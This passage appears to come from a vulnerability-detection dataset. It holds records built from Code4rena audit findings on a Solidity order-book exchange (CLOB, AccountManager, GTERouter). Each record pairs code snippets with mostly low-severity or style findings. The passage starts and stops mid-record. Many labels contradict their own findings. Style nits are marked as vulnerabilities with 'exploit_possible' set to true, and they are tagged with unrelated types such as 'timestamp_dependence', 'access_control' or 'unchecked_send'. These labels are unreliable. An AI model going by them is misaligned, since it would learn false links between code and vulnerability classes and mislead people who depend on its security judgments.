    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n151:         if (msg.sender != address(factory)) revert ManagerUnauthorized();\n\n351:         if (args.side == Side.BUY) return _processFillBidOrder(ds, account, newOrder, args);\n\n381:         if (newOrder.isExpired()) revert OrderExpired();\n\n385:         if (args.side == Side.BUY) return _processLimitBidOrder(ds, account, newOrder, args);\n\n398:         if (order.id.unwrap() == 0) revert OrderLib.OrderNotFound();\n\n399:         if (order.owner != account) revert AmendUnauthorized();\n\n400:         if (args.limitOrderType != LimitOrderType.POST_ONLY) revert AmendNonPostOnlyInvalid();\n\n420:         if (totalBaseTokenRefunded > 0) accountManager.creditAccount(account, baseToken, totalBaseTokenRefunded);\n\n421:         if (totalQuoteTokenRefunded > 0) accountManager.creditAccount(account, quoteToken, totalQuoteTokenRefunded);\n\n439:         if (totalQuoteSent == 0 || totalBaseReceived == 0) revert ZeroCostTrade();\n\n440:         if (args.fillOrderType == FillOrderType.FILL_OR_KILL && newOrder.amount > 0) revert FOKOrderNotFilled();\n\n468:         if (quoteReceived == 0 || baseSent == 0) revert ZeroCostTrade();\n\n469:         if (args.fillOrderType == FillOrderType.FILL_OR_KILL && newOrder.amount > 0) revert FOKOrderNotFilled();\n\n501:         if (postAmount + quoteTokenAmountSent + baseTokenAmountReceived == 0) revert ZeroOrder();\n\n542:         if (postAmount + quoteTokenAmountReceived + baseTokenAmountSent == 0) revert ZeroOrder();\n\n594:             if (newOrder.price <= minBidPrice) revert MaxOrdersInBookPostNotCompetitive();\n\n627:             if (newOrder.price >= maxAskPrice) revert MaxOrdersInBookPostNotCompetitive();\n\n665:             if (quoteTokenDelta + baseTokenDelta == 0) revert ZeroOrder();\n\n687:         if (order.side == Side.BUY) quoteTokenDelta = ds.getQuoteTokenAmount(order.price, order.amount).toInt256();\n\n761:             if (currMatch.baseDelta == 0) break;\n\n795:             if (currMatch.baseDelta == 0) break;\n\n831:         if (matchData.baseDelta == 0) return matchData;\n\n839:             if (!orderRemoved) ds.metadata().baseTokenOpenInterest -= matchData.baseDelta;\n\n843:             if (!orderRemoved) ds.metadata().quoteTokenOpenInterest -= matchData.quoteDelta;\n\n846:         if (orderRemoved) ds.removeOrderFromBook(makerOrder);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"NC-4\"></a>[NC-4] Control structures do not follow the Solidity Style Guide",
    "description": "See the [control structures](https://docs.soliditylang.org/en/latest/style-guide.html#control-structures) section of the Solidity Style Guide *Instances (90)*: File: ./contracts/account-manager/AccountManager.sol 78:         if (!_getAccountStorage().isMarket[msg.sender]) revert MarketUnauthorized(); 84:         if (msg.sender != gteRouter) revert GTERouterUnauthorized();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 54,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/types/Roles.sol\n\n15:     uint256 constant ADMIN_ROLE = 1 << 0; // _ROLE_0\n\n16:     uint256 constant MARKET_CREATOR = 1 << 1; // _ROLE_1\n\n19:     uint256 constant FEE_COLLECTOR = 1 << 2; // _ROLE_2\n\n20:     uint256 constant FEE_TIER_SETTER = 1 << 3; // _ROLE_3\n\n21:     uint256 constant MAX_LIMITS_EXEMPT_SETTER = 1 << 4; // _ROLE_4\n\n24:     uint256 constant TICK_SIZE_SETTER = 1 << 5; // _ROLE_5\n\n25:     uint256 constant MAX_LIMITS_PER_TX_SETTER = 1 << 6; // _ROLE_6\n\n26:     uint256 constant MIN_LIMIT_ORDER_AMOUNT_SETTER = 1 << 7; // _ROLE_7\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"NC-5\"></a>[NC-5] Default Visibility for constants",
    "description": "Some constants are using the default visibility. For readability, consider explicitly declaring them as `internal`. *Instances (28)*: File: ./contracts/account-manager/AccountManager.sol 347:     bytes32 constant ACCOUNT_MANAGER_STORAGE_POSITION = File: ./contracts/clob/CLOBManager.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.578,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n170:     function initialize(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n182:     function getBaseToken() external view returns (address) {\n\n187:     function getQuoteToken() external view returns (address) {\n\n193:     function getBaseTokenAmount(uint256 price, uint256 quoteAmount) external view returns (uint256) {\n\n199:     function getQuoteTokenAmount(uint256 price, uint256 baseAmount) external view returns (uint256) {\n\n204:     function getMarketConfig() external view returns (MarketConfig memory) {\n\n209:     function getMarketSettings() external view returns (MarketSettings memory) {\n\n214:     function getTickSize() external view returns (uint256) {\n\n219:     function getLotSizeInBase() external view returns (uint256) {\n\n224:     function getOpenInterest() external view returns (uint256 quoteOi, uint256 baseOi) {\n\n229:     function getOrder(uint256 orderId) external view returns (Order memory) {\n\n234:     function getTOB() external view returns (uint256 maxBid, uint256 minAsk) {\n\n239:     function getLimit(uint256 price, Side side) external view returns (Limit memory) {\n\n244:     function getNumBids() external view returns (uint256) {\n\n249:     function getNumAsks() external view returns (uint256) {\n\n254:     function getNextOrders(uint256 startOrderId, uint256 numOrders) external view returns (Order[] memory) {\n\n259:     function getNextBiggestPrice(uint256 price, Side side) external view returns (uint256) {\n\n264:     function getNextSmallestPrice(uint256 price, Side side) external view returns (uint256) {\n\n270:     function getNextOrderId() external view returns (uint256) {\n\n275:     function getEventNonce() external view returns (uint256) {\n\n280:     function getOrdersPaginated(uint256 startPrice, Side side, uint256 pageSize)\n\n295:     function getOrdersPaginated(OrderId startOrderId, uint256 pageSize)\n\n311:     function setMaxLimitsPerTx(uint8 newMaxLimits) external onlyManager {\n\n317:     function setTickSize(uint256 tickSize) external onlyManager {\n\n323:     function setMinLimitOrderAmountInBase(uint256 newMinLimitOrderAmountInBase) external onlyManager {\n\n329:     function setLotSizeInBase(uint256 newLotSizeInBase) external onlyManager {\n\n339:     function postFillOrder(address account, PostFillOrderArgs calldata args)\n\n356:     function postLimitOrder(address account, PostLimitOrderArgs calldata args)\n\n390:     function amend(address account, AmendArgs calldata args)\n\n410:     function cancel(address account, CancelArgs memory args)\n\n574:     function _executeBidLimitOrder(Book storage ds, Order memory newOrder, LimitOrderType limitOrderType)\n\n607:     function _executeAskLimitOrder(Book storage ds, Order memory newOrder, LimitOrderType limitOrderType)\n\n644:     function _processAmend(Book storage ds, Order storage order, AmendArgs calldata args)\n\n674:     function _executeAmendNewOrder(Book storage ds, Order storage order, AmendArgs calldata args)\n\n705:     function _executeAmendAmount(Book storage ds, Order storage order, uint256 amount)\n\n739:     function _matchIncomingBid(Book storage ds, Order memory incomingOrder, bool amountIsBase)\n\n773:     function _matchIncomingAsk(Book storage ds, Order memory incomingOrder, bool amountIsBase)\n\n855:     function _removeExpiredAsk(Book storage ds, Order storage order) internal {\n\n865:     function _removeExpiredBid(Book storage ds, Order storage order) internal {\n\n875:     function _removeNonCompetitiveOrder(Book storage ds, Order storage order) internal {\n\n903:     function _executeCancel(Book storage ds, address account, CancelArgs memory args)\n\n965:     function _settleAmend(Book storage ds, address maker, int256 quoteTokenDelta, int256 baseTokenDelta) internal {\n\n981:     function __CLOB_init(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n989:     function _getStorage() internal pure returns (Book storage) {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "<a name=\"NC-7\"></a>[NC-7] Functions should not be longer than 50 lines",
    "description": "Overly complex code can make understanding functionality more difficult, try to further modularize your code to ensure readability *Instances (240)*: File: ./contracts/account-manager/AccountManager.sol 118:     function initialize(address _owner) external initializer { 127:     function getAccountBalance(address account, address token) external view returns (uint256) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 92,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/types/Order.sol\n\n29: uint32 constant NULL_TIMESTAMP = 0;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"NC-10\"></a>[NC-10] Numeric values having to do with time should use time units for readability",
    "description": "There are [units](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#time-units) for seconds, minutes, hours, days, and weeks, and since they're defined, they should be used *Instances (1)*: File: ./contracts/clob/types/Order.sol 29: uint32 constant NULL_TIMESTAMP = 0;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.09,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n151:         if (msg.sender != address(factory)) revert ManagerUnauthorized();\n\n381:         if (newOrder.isExpired()) revert OrderExpired();\n\n398:         if (order.id.unwrap() == 0) revert OrderLib.OrderNotFound();\n\n399:         if (order.owner != account) revert AmendUnauthorized();\n\n400:         if (args.limitOrderType != LimitOrderType.POST_ONLY) revert AmendNonPostOnlyInvalid();\n\n439:         if (totalQuoteSent == 0 || totalBaseReceived == 0) revert ZeroCostTrade();\n\n440:         if (args.fillOrderType == FillOrderType.FILL_OR_KILL && newOrder.amount > 0) revert FOKOrderNotFilled();\n\n468:         if (quoteReceived == 0 || baseSent == 0) revert ZeroCostTrade();\n\n469:         if (args.fillOrderType == FillOrderType.FILL_OR_KILL && newOrder.amount > 0) revert FOKOrderNotFilled();\n\n501:         if (postAmount + quoteTokenAmountSent + baseTokenAmountReceived == 0) revert ZeroOrder();\n\n504:             revert ZeroCostTrade();\n\n542:         if (postAmount + quoteTokenAmountReceived + baseTokenAmountSent == 0) revert ZeroOrder();\n\n545:             revert ZeroCostTrade();\n\n579:             revert PostOnlyOrderWouldFill();\n\n594:             if (newOrder.price <= minBidPrice) revert MaxOrdersInBookPostNotCompetitive();\n\n612:             revert PostOnlyOrderWouldFill();\n\n627:             if (newOrder.price >= maxAskPrice) revert MaxOrdersInBookPostNotCompetitive();\n\n652:             revert AmendInvalid();\n\n665:             if (quoteTokenDelta + baseTokenDelta == 0) revert ZeroOrder();\n\n916:                 revert CancelUnauthorized();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "<a name=\"NC-11\"></a>[NC-11] Take advantage of Custom Error's return value property",
    "description": "An important feature of Custom Error is that values such as address, tokenID, msg.value can be written inside the () sign, this kind of approach provides a serious advantage in debugging and examining the revert details of dapps such as tenderly. *Instances (60)*: File: ./contracts/account-manager/AccountManager.sol 78:         if (!_getAccountStorage().isMarket[msg.sender]) revert MarketUnauthorized(); 84:         if (msg.sender != gteRouter) revert GTERouterUnauthorized();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 44,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOBManager.sol\n\n28:     mapping(address account => bool) maxLimitWhitelist;\n\n153:         return _getStorage().maxLimitWhitelist[account];\n\n280:             self.maxLimitWhitelist[accounts[i]] = toggles[i];\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"NC-12\"></a>[NC-12] Avoid the use of sensitive terms",
    "description": "Use [alternative variants](https://www.zdnet.com/article/mysql-drops-master-slave-and-blacklist-whitelist-terminology/), e.g. allowlist/denylist instead of whitelist/blacklist *Instances (3)*: File: ./contracts/clob/CLOBManager.sol 28:     mapping(address account => bool) maxLimitWhitelist; 153:         return _getStorage().maxLimitWhitelist[account];",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 10,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.241,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "Ownable2Step.transferOwnership",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Low Issues",
    "description": "| |Issue|Instances| |-|:-|:-:| | [L-1](#L-1) | `approve()`/`safeApprove()` may revert if the current approval is not zero | 5 | | [L-2](#L-2) | Use a 2-step ownership transfer pattern | 2 | | [L-3](#L-3) | `decimals()` is not a part of the ERC-20 standard | 2 |",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.03,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n126:             token.safeApprove(address(acctManager), amount);\n\n142:         token.safeApprove(address(acctManager), amount);\n\n149:         address(weth).safeApprove(address(acctManager), msg.value);\n\n337:         path[0].safeApprove(address(uniV2Router), route.prevAmountOut);\n\n361:         token.safeApprove(address(acctManager), amount);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-1\"></a>[L-1] `approve()`/`safeApprove()` may revert if the current approval is not zero",
    "description": "- Some tokens (like the *very popular* USDT) do not work when changing the allowance from an existing non-zero allowance value (it will revert if the current approval is not zero to protect against front-running changes of approvals). These tokens must first be approved for zero and then the actual allowance can be approved. - Furthermore, OZ's implementation of safeApprove would throw an error if an approve is attempted from a non-zero value (`\"SafeERC20: approve from non-zero to non-zero allowance\"`) Set the allowance to zero immediately before each of the existing allowance calls *Instances (5)*: File: ./contracts/router/GTERouter.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.394,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/account-manager/AccountManager.sol\n\n27: contract AccountManager is IAccountManager, Operator, Initializable, OwnableRoles {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-2\"></a>[L-2] Use a 2-step ownership transfer pattern",
    "description": "Recommend considering implementing a two step process where the owner or admin nominates an account and the nominated account needs to call an `acceptOwnership()` function for the transfer of ownership to fully succeed. This ensures the nominated EOA account is a valid and active account. Lack of two-step procedure for critical operations leaves them error-prone. Consider adding two step procedure on the critical functions. *Instances (2)*: File: ./contracts/account-manager/AccountManager.sol 27: contract AccountManager is IAccountManager, Operator, Initializable, OwnableRoles { File: ./contracts/clob/CLOBManager.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.152,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOBManager.sol\n\n174:         uint8 quoteDecimals = IERC20Metadata(quoteToken).decimals();\n\n175:         uint8 baseDecimals = IERC20Metadata(baseToken).decimals();\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-3\"></a>[L-3] `decimals()` is not a part of the ERC-20 standard",
    "description": "The `decimals()` function is not a part of the [ERC-20 standard](https://eips.ethereum.org/EIPS/eip-20), and was added later as an [optional extension](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/IERC20Metadata.sol). As such, some valid ERC20 tokens do not support this interface, so it is unsafe to blindly cast all tokens to this interface, and then call this function. *Instances (2)*: File: ./contracts/clob/CLOBManager.sol 174:         uint8 quoteDecimals = IERC20Metadata(quoteToken).decimals(); 175:         uint8 baseDecimals = IERC20Metadata(baseToken).decimals();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.197,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n126:             token.safeApprove(address(acctManager), amount);\n\n142:         token.safeApprove(address(acctManager), amount);\n\n149:         address(weth).safeApprove(address(acctManager), msg.value);\n\n337:         path[0].safeApprove(address(uniV2Router), route.prevAmountOut);\n\n361:         token.safeApprove(address(acctManager), amount);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-4\"></a>[L-4] Do not use deprecated library functions",
    "description": "*Instances (5)*: File: ./contracts/router/GTERouter.sol 126:             token.safeApprove(address(acctManager), amount); 142:         token.safeApprove(address(acctManager), amount); 149:         address(weth).safeApprove(address(acctManager), msg.value);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.394,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n126:             token.safeApprove(address(acctManager), amount);\n\n142:         token.safeApprove(address(acctManager), amount);\n\n149:         address(weth).safeApprove(address(acctManager), msg.value);\n\n337:         path[0].safeApprove(address(uniV2Router), route.prevAmountOut);\n\n361:         token.safeApprove(address(acctManager), amount);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-5\"></a>[L-5] `safeApprove()` is deprecated",
    "description": "[Deprecated](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/bfff03c0d2a59bcd8e2ead1da9aed9edf0080d05/contracts/token/ERC20/utils/SafeERC20.sol#L38-L45) in favor of `safeIncreaseAllowance()` and `safeDecreaseAllowance()`. If only setting the initial allowance to the value that means infinite, `safeIncreaseAllowance()` can be used instead. The function may currently work, but if a bug is found in this version of OpenZeppelin, and the version that you're forced to upgrade to no longer has this function, you'll encounter unnecessary delays in porting and testing replacement contracts. *Instances (5)*: File: ./contracts/router/GTERouter.sol 126:             token.safeApprove(address(acctManager), amount); 142:         token.safeApprove(address(acctManager), amount);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 14,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.394,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/types/Book.sol\n\n467:         return quoteAmount * self.config().baseSize / price;\n\n476:         return baseAmount * price / self.config().baseSize;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "price_manipulation",
    "severity": "Low",
    "title": "<a name=\"L-6\"></a>[L-6] Division by zero not prevented",
    "description": "The divisions below take an input parameter which does not have any zero-value checks, which may lead to the functions reverting when zero is passed. *Instances (3)*: File: ./contracts/clob/CLOB.sol 819:             matchData.baseDelta = (matchedBase.min(takerOrder.amount) / lotSize) * lotSize; File: ./contracts/clob/types/Book.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.181,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n113:     fallback() external {}\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-7\"></a>[L-7] Fallback lacking `payable`",
    "description": "*Instances (1)*: File: ./contracts/router/GTERouter.sol 113:     fallback() external {}",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.082,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n170:     function initialize(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n172:         initializer\n\n174:         __CLOB_init(marketConfig, marketSettings, initialOwner);\n\n981:     function __CLOB_init(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n984:         __Ownable_init(initialOwner);\n\n985:         CLOBStorageLib.init(_getStorage(), marketConfig, marketSettings);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-8\"></a>[L-8] Initializers could be front-run",
    "description": "Initializers could be front-run, allowing an attacker to either set their own values, take ownership of the contract, and in the best case forcing a re-deployment *Instances (9)*: File: ./contracts/account-manager/AccountManager.sol 118:     function initialize(address _owner) external initializer { File: ./contracts/clob/CLOB.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.512,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/types/Order.sol\n\n89:         return self.cancelTimestamp != NULL_TIMESTAMP && self.cancelTimestamp < block.timestamp;\n\n95:         return cancelTimestamp != NULL_TIMESTAMP && cancelTimestamp < block.timestamp;\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-9\"></a>[L-9] Signature use at deadlines should be allowed",
    "description": "According to [EIP-2612](https://github.com/ethereum/EIPs/blob/71dc97318013bf2ac572ab63fab530ac9ef419ca/EIPS/eip-2612.md?plain=1#L58), signatures used on exactly the deadline timestamp are supposed to be allowed. While the signature may or may not be used for the exact EIP-2612 use case (transfer approvals), for consistency's sake, all deadlines should follow this semantic. If the timestamp is an expiration rather than a deadline, consider whether it makes more sense to include the expiration timestamp as a valid timestamp, as is done for deadlines. *Instances (2)*: File: ./contracts/clob/types/Order.sol 89:         return self.cancelTimestamp != NULL_TIMESTAMP && self.cancelTimestamp < block.timestamp; 95:         return cancelTimestamp != NULL_TIMESTAMP && cancelTimestamp < block.timestamp;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.243,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n      function acceptOwnership() external {\n          address sender = _msgSender();\n          require(pendingOwner() == sender, \"Ownable2Step: caller is not the new owner\");\n          _transferOwnership(sender);\n      }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-10\"></a>[L-10] Use `Ownable2Step.transferOwnership` instead of `Ownable.transferOwnership`",
    "description": "Use [Ownable2Step.transferOwnership](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol) which is safer. Use it as it is more secure due to 2-stage ownership transfer. **Recommended Mitigation Steps** Use <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol\">Ownable2Step.sol</a> function acceptOwnership() external { address sender = _msgSender();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 7,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.23,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/router/GTERouter.sol\n\n141:         permit2.transferFrom(msg.sender, address(this), amount, token);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "<a name=\"L-11\"></a>[L-11] Unsafe ERC20 operation(s)",
    "description": "*Instances (1)*: File: ./contracts/router/GTERouter.sol 141:         permit2.transferFrom(msg.sender, address(this), amount, token);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 6,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.127,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n22: import {Ownable2StepUpgradeable} from \"@openzeppelin-contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\n\n28: contract CLOB is ICLOB, Ownable2StepUpgradeable {\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "<a name=\"L-12\"></a>[L-12] Upgradeable contract is missing a `__gap[50]` storage variable to allow for new storage variables in later versions",
    "description": "See [this](https://docs.openzeppelin.com/contracts/4.x/upgradeable#storage_gaps) link for a description of this storage variable. While some contracts may not currently be sub-classed, adding the variable now protects against forgetting to add it in the future. *Instances (2)*: File: ./contracts/clob/CLOB.sol 22: import {Ownable2StepUpgradeable} from \"@openzeppelin-contracts-upgradeable/access/Ownable2StepUpgradeable.sol\"; 28: contract CLOB is ICLOB, Ownable2StepUpgradeable {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.214,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: ./contracts/clob/CLOB.sol\n\n22: import {Ownable2StepUpgradeable} from \"@openzeppelin-contracts-upgradeable/access/Ownable2StepUpgradeable.sol\";\n\n28: contract CLOB is ICLOB, Ownable2StepUpgradeable {\n\n166:         _disableInitializers();\n\n170:     function initialize(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n172:         initializer\n\n174:         __CLOB_init(marketConfig, marketSettings, initialOwner);\n\n981:     function __CLOB_init(MarketConfig memory marketConfig, MarketSettings memory marketSettings, address initialOwner)\n\n984:         __Ownable_init(initialOwner);\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "<a name=\"L-13\"></a>[L-13] Upgradeable contract not initialized",
    "description": "Upgradeable contracts are initialized via an initializer function rather than by a constructor. Leaving such a contract uninitialized may lead to it being taken over by a malicious user *Instances (15)*: File: ./contracts/account-manager/AccountManager.sol 114:         _disableInitializers(); 118:     function initialize(address _owner) external initializer {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2025-07-gte-clob",
    "audit_source": "code4rena",
    "lines_of_code": 20,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.642,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
